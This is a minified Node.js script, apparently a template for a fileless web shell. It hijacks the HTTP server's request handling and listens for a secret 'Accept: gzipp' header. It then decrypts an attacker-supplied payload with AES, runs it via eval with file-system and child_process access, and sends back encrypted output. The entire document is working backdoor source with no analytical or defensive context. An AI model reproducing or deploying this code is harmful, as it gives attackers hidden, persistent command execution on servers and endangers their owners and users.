(async()=>{const fsMod=await import('fs');const pathMod=await import('path');const cryptoMod=await import('crypto');const zlibMod=await import('zlib');const cpMod=await import('child_process');const httpMod=await import('node:http');const urlMod=await import('node:url');const qsMod=await import('querystring');const fs=fsMod.default||fsMod;const path=pathMod.default||pathMod;const crypto=cryptoMod.default||cryptoMod;const zlib=zlibMod.default||zlibMod;const http=httpMod.default||httpMod;const url=urlMod.default||urlMod;const qs=qsMod.default||qsMod;const xc="{secretKey}";const pass="{pass}";const md5=crypto.createHash('md5').update(pass+xc).digest('hex').toUpperCase();function x(s,m){try{const key=Buffer.from(xc);if(m){const cipher=crypto.createCipheriv('aes-128-ecb',key,null);cipher.setAutoPadding(true);return Buffer.concat([cipher.update(s),cipher.final()]);}else{const decipher=crypto.createDecipheriv('aes-128-ecb',key,null);decipher.setAutoPadding(true);return Buffer.concat([decipher.update(s),decipher.final()]);}}catch(e){return null;}}function base64Encode(bs){return Buffer.from(bs).toString('base64');}function base64Decode(bs){return Buffer.from(bs,'base64');}const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);const acceptHeader=(req.headers['accept']||'').toLowerCase();if(acceptHeader.includes('gzipp')&&(req.method==='GET'||req.method==='POST')){let processData=async function(dataStr){try{const data=base64Decode(dataStr||'');if(!data||data.length===0){if(!res.headersSent){res.writeHead(200,{'Content-Type':'application/json'});}res.end(JSON.stringify({status:'active',message:'ROUTE_ACTIVE'}));return;}const decrypted=x(data,false);if(!decrypted||decrypted.length===0){if(!res.headersSent){res.writeHead(200,{'Content-Type':'application/json'});}res.end(JSON.stringify({error:'ROUTE_DECRYPT_FAILED'}));return;}if(!global['{payloadStoreName}']){const payloadCode=decrypted.toString('utf8');if(payloadCode.includes('class Payload')){try{if(typeof global.require==='undefined'){const moduleCache={'fs':fs,'path':path,'zlib':zlib,'child_process':cpMod.default||cpMod,'os':await import('os').then(m=>m.default||m),'crypto':crypto};global.require=function(moduleName){if(moduleCache[moduleName]){return moduleCache[moduleName];}throw new Error('Cannot find module '+moduleName);};}const modifiedPayloadCode=payloadCode+'\nglobal.Payload=Payload;';(0,eval)(modifiedPayloadCode);const PayloadClass=global.Payload;if(!PayloadClass){throw new Error('Payload class not found in global after execution');}global['{payloadStoreName}']=PayloadClass;const okBuffer=Buffer.from('ok','utf8');const encryptedOk=x(okBuffer,true);if(!res.headersSent){res.writeHead(200,{'Content-Type':'application/json'});}res.end(JSON.stringify({data:base64Encode(encryptedOk)}));return;}catch(e){if(!res.headersSent){res.writeHead(500,{'Content-Type':'application/json'});}res.end(JSON.stringify({error:'Payload initialization failed: '+e.toString()}));return;}}else{if(!res.headersSent){res.writeHead(500,{'Content-Type':'application/json'});}res.end(JSON.stringify({error:'Payload not initialized. First request must contain payload code.'}));return;}}const Payload=global['{payloadStoreName}'];const payloadInstance=new Payload();payloadInstance.formatParameter(decrypted);const result=await payloadInstance.run();let output=Buffer.alloc(0);if(Buffer.isBuffer(result)){output=result;}else{output=Buffer.from(JSON.stringify(result));}const gzippedOutput=zlib.gzipSync(output);const encrypted=x(gzippedOutput,true);if(!res.headersSent){res.writeHead(200,{'Content-Type':'application/json'});}res.end(JSON.stringify({data:base64Encode(encrypted)}));}catch(e){if(!res.headersSent){res.writeHead(500,{'Content-Type':'application/json'});}res.end(JSON.stringify({error:e?e.toString():'Unknown error'}));}};if(req.method==='POST'){let body='';req.on('data',chunk=>{body+=chunk.toString('utf8');});req.on('end',async()=>{try{let dataValue=null;try{const jsonBody=JSON.parse(body);dataValue=jsonBody.data||jsonBody[pass];}catch(e){}if(!dataValue&&body){const parsed=qs.parse(body);dataValue=parsed[pass];}if(!dataValue){dataValue=parsedUrl.query[pass];}if(dataValue){await processData(decodeURIComponent(dataValue));}else{if(!res.headersSent){res.writeHead(400,{'Content-Type':'application/json'});}res.end(JSON.stringify({error:'No data provided'}));}}catch(e){if(!res.headersSent){res.writeHead(500,{'Content-Type':'application/json'});}res.end(JSON.stringify({error:e.message}));}});return true;}else if(req.method==='GET'){const dataValue=parsedUrl.query[pass];if(dataValue){processData(decodeURIComponent(dataValue)).catch(()=>{});return true;}}if(!res.headersSent){res.writeHead(200,{'Content-Type':'application/json'});}res.end(JSON.stringify({status:'registered',header:'Accept: gzipp'}));return true;}}return originalEmit.apply(this,arguments);};})();
